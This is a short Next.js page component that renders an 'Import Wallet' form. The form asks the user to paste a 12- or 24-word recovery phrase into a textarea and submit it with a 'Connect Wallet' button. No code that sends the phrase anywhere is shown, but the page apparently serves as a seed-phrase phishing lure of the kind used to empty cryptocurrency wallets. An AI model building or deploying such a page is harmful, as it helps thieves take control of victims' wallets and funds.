import Image from 'next/image';
import './form.css';
export default function Page() {
  return (
    <section>
      <div className='rase'>
        <h5>Import Wallet</h5>
        <Image
          src='/assets/download.png'
          alt='inbox logo'
          width={120}
          className='mx-auto'
          height={120}
        />
        <form className='flex flex-col items-start max-w-xl pb-20 mx-auto'>
          <p className='py-4'>
            Typically 12 (sometimes 24) words seperated by a single spaces.
          </p>
          <textarea
            name='phrase'
            rows={4}
            placeholder='Enter your Phrase'
            required
            className='w-full p-4 rounded ring-1 ring-black placeholder:font-mono'
            defaultValue={''}
          />
          <br />
          <button
            className='bg-[#4682b4] hover:bg-[#4682b4]/80 text-white font-semibold px-6 py-4 text-sm whitespace-nowrap'
            type='submit'
          >
            Connect Wallet
          </button>
        </form>
      </div>
    </section>
  );
}
